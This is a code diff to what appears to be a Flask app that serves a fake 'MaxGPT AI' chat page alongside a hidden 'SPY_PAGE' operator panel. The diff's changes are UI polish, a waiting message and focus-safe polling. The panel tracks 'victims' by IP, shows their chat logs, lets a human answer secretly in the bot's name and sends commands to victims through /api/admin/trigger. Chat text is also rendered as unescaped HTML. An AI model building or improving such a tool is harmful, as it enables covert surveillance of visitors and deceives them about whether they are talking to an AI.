@@ -500,7 +500,8 @@ async function fetchMessages() {
     if (d.messages) {
         d.messages.forEach(m => {
             let imgTag = m.img ? `<br><img src="${m.img}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
-            let botText = m.bot === "..." ? '<div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>' : m.bot;
+            // Если бот в ручном режиме ожидает ответа, показываем обычный текст без анимации точек
+            let botText = m.bot === "..." ? "Ожидаем ответ специалиста..." : m.bot;
             html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
             html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${botText}</div></div></div>`;
         });
@@ -704,20 +705,24 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 <script>
-// Автоматический запрос данных для панели без перезагрузки страницы (никаких сбросов клавиатуры!)
+// Авто-обновление админки БЕЗ сброса фокуса с клавиатуры при наборе текста
 async function pollAdminData() {
+    // Если пользователь сейчас печатает что-то в текстовое поле, пропускаем этот цикл обновления, чтобы не сбивать фокус и клавиатуру
+    let activeEl = document.activeElement;
+    if (activeEl && activeEl.tagName === 'TEXTAREA' && activeEl.classList.contains('manual-input')) {
+        return; 
+    }
+
     try {
         let r = await fetch('/api/admin/data');
         let d = await r.json();
         
-        // Рендерим жертв
         let vGrid = document.getElementById('victimsContainer');
         if (Object.keys(d.victims).length > 0) {
             let vHtml = '';
             for (let ip in d.victims) {
                 let data = d.victims[ip];
                 let sanitizedIpId = ip.replaceAll('.', '_');
-                // Пытаемся сохранить уже набранный текст в textarea, если она открыта
                 let existingInput = document.getElementById('msg_' + sanitizedIpId);
                 let currentTypedText = existingInput ? existingInput.value : '';
 
@@ -760,7 +765,6 @@ async function pollAdminData() {
             vGrid.innerHTML = '<div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв.</div>';
         }
 
-        // Рендерим логи
         let lContainer = document.getElementById('logsContainer');
         if (d.logs.length > 0) {
             let lHtml = '';
@@ -784,7 +788,7 @@ async function pollAdminData() {
         }
     } catch(e) {}
 }
-setInterval(pollAdminData, 2000); // Обновление админки в фоне каждые 2 секунды без сброса инпутов
+setInterval(pollAdminData, 2000);
 
 async function triggerAction(ip, cmd) {
     await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
@@ -851,7 +855,6 @@ def spy():
     except Exception as e:
         return f"Ошибка: {str(e)}", 500
 
-# Новый JSON эндпоинт для бесшовного обновления панели управления
 @app.route("/api/admin/data")
 def admin_data_api():
     reversed_logs = list(reversed(chat_logs)) if chat_logs else []
